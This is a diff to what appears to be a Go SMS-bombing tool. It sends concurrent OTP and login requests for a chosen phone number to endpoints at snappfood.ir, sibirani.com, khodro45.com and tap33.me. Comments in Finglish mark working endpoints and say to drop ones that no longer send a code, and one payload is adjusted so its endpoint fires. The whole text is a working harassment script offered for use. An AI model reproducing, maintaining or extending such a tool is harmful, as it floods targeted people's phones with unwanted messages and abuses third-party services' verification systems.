@@ -328,21 +328,22 @@ func main() {
 		 	formData.Set("cellphone", p)
 		 	sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
 		 }(phone)  // active ✅
-		// sandbox.sibirani.com generator-inv-token (JSON)
+		// sandbox.sibirani.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
 			"username": phone,
-		}, &wg, ch)
+		}, &wg, ch) // aghe kod nadad pakesh kon chon rahi nadareh.❌❌
 		// khodro45.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
 			"mobile": phone,
+			"device_type": 2,
 		}, &wg, ch)		
                 // tap33.me v2/user (JSON - adjusted payload format)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://tap33.me/api/v2/user", map[string]interface{}{
 			"phoneNumber": phone,
-		}, &wg, ch)
+		}, &wg, ch) // aghe kod nadad pakesh kon chon rahi nadareh.❌❌
 
 	}
 
